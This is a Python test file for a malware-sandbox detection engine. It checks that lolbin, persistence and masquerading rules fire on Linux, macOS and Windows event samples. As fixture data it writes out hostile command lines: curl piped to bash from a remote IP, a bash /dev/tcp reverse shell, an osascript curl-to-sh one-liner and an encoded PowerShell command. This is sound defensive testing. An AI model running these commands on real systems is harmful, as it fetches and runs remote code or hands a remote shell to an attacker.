"""Tests for roadmap 1.2 — platform-aware detection rules.

The same detection engine must fire the right rules for the right platform:
Linux signals (curl|sh, ~/.bashrc writes) alert just like their Windows
counterparts (registry Run keys, PowerShell -enc).
"""

import datetime

from .conftest import make_run


def _ts(offset_seconds: int = 0) -> str:
    return (
        datetime.datetime(2026, 8, 1, 12, 0, 0, tzinfo=datetime.timezone.utc)
        + datetime.timedelta(seconds=offset_seconds)
    ).isoformat()


def _ingest(client, run_id: str, events: list[dict]) -> None:
    resp = client.post("/ingest/batch", json=events)
    assert resp.status_code == 202, resp.text


def _linux_proc(run_id: str, pid: int, ppid: int, name: str, cmd: str, ts: int = 0) -> dict:
    return {
        "run_id": run_id, "platform": "linux", "event_type": "process_create",
        "timestamp": _ts(ts), "pid": pid, "ppid": ppid, "process_name": name,
        "command_line": cmd,
    }


def _linux_write(run_id: str, pid: int, path: str, ts: int = 0) -> dict:
    return {
        "run_id": run_id, "platform": "linux", "event_type": "file_write",
        "timestamp": _ts(ts), "pid": pid, "file_path": path,
    }


def _alerts(client, run_id: str) -> list[dict]:
    return client.get(f"/runs/{run_id}/alerts").json()


def test_linux_lolbin_curl_piped_to_shell(client):
    run_id = make_run(client, sample_name="lin-dropper.sh", platform="linux")
    _ingest(client, run_id, [
        _linux_proc(run_id, 100, 1, "sh", "sh -c 'curl -s http://198.51.100.9/x.sh | bash'", ts=1),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "lolbin-abuse"]
    assert len(fired) == 1
    assert "curl piped to shell" in fired[0]["details"]


def test_linux_bash_dev_tcp_reverse_shell(client):
    run_id = make_run(client, sample_name="revshell.sh", platform="linux")
    _ingest(client, run_id, [
        _linux_proc(run_id, 100, 1, "bash", "bash -i >& /dev/tcp/198.51.100.10/4444 0>&1", ts=1),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "lolbin-abuse"]
    assert len(fired) == 1
    assert "reverse shell" in fired[0]["details"]


def test_linux_autostart_persistence_bashrc(client):
    run_id = make_run(client, sample_name="persist.sh", platform="linux")
    _ingest(client, run_id, [
        _linux_write(run_id, 100, "/home/victim/.bashrc", ts=1),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "autostart-persistence"]
    assert len(fired) == 1
    assert ".bashrc" in fired[0]["details"]


def test_linux_masquerading_bash_from_tmp(client):
    run_id = make_run(client, sample_name="fake-bash", platform="linux")
    _ingest(client, run_id, [
        _linux_proc(run_id, 100, 1, "bash", "/tmp/bash -i", ts=1),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "masquerading"]
    assert len(fired) == 1
    assert "/usr/bin/bash" in fired[0]["details"]


def test_linux_plain_write_does_not_fire_windows_rules(client):
    """A Linux file write must not fire the Windows registry rule."""
    run_id = make_run(client, sample_name="benign.sh", platform="linux")
    _ingest(client, run_id, [
        _linux_write(run_id, 100, "/home/victim/report.txt", ts=1),
        _linux_proc(run_id, 101, 100, "echo", "echo done", ts=2),
    ])
    fired = _alerts(client, run_id)
    assert all(a["rule_id"] != "registry-persistence" for a in fired)


def _mac_proc(run_id: str, pid: int, ppid: int, name: str, cmd: str, ts: int = 0) -> dict:
    return {
        "run_id": run_id, "platform": "macos", "event_type": "process_create",
        "timestamp": _ts(ts), "pid": pid, "ppid": ppid, "process_name": name,
        "command_line": cmd,
    }


def _mac_write(run_id: str, pid: int, path: str, ts: int = 0) -> dict:
    return {
        "run_id": run_id, "platform": "macos", "event_type": "file_write",
        "timestamp": _ts(ts), "pid": pid, "file_path": path,
    }


def test_macos_osascript_lolbin(client):
    """Roadmap 3.2 — osascript 'do shell script' is the macOS LOLBin."""
    run_id = make_run(client, sample_name="mac-jxa.scpt", platform="macos")
    _ingest(client, run_id, [
        _mac_proc(run_id, 300, 1, "osascript",
                  "osascript -e 'do shell script \"curl -s http://198.51.100.20/x.sh | sh\"'", ts=1),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "lolbin-abuse"]
    assert len(fired) == 1
    assert "osascript" in fired[0]["details"]


def test_macos_launchagent_persistence(client):
    """Roadmap 3.2 — a LaunchAgents plist write is autostart persistence."""
    run_id = make_run(client, sample_name="mac-persist", platform="macos")
    _ingest(client, run_id, [
        _mac_write(run_id, 300, "/Users/victim/Library/LaunchAgents/com.apple.Updater.plist", ts=1),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "autostart-persistence"]
    assert len(fired) == 1
    assert "LaunchAgents" in fired[0]["details"]


def test_windows_rules_still_fire(client):
    """Regression: the Windows scenario keeps its original rule set."""
    run_id = make_run(client, sample_name="win-sample.exe")
    _ingest(client, run_id, [
        {
            "run_id": run_id, "platform": "windows", "event_type": "process_create",
            "timestamp": _ts(1), "pid": 200, "ppid": 4, "process_name": "svchost.exe",
            "command_line": r"C:\Temp\svchost.exe",  # wrong path — masquerading
        },
        {
            "run_id": run_id, "platform": "windows", "event_type": "process_create",
            "timestamp": _ts(2), "pid": 210, "ppid": 4, "process_name": "winword.exe",
            "command_line": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE /q /n",
        },
        {
            "run_id": run_id, "platform": "windows", "event_type": "process_create",
            "timestamp": _ts(3), "pid": 211, "ppid": 210, "process_name": "powershell.exe",
            "command_line": "powershell.exe -enc SQBFAFgAAGgBdAA=",
        },
    ])
    ids = {a["rule_id"] for a in _alerts(client, run_id)}
    assert "masquerading" in ids        # svchost from C:\Temp
    assert "suspicious-parent-child" in ids  # winword → powershell
    assert "lolbin-abuse" in ids        # powershell -enc
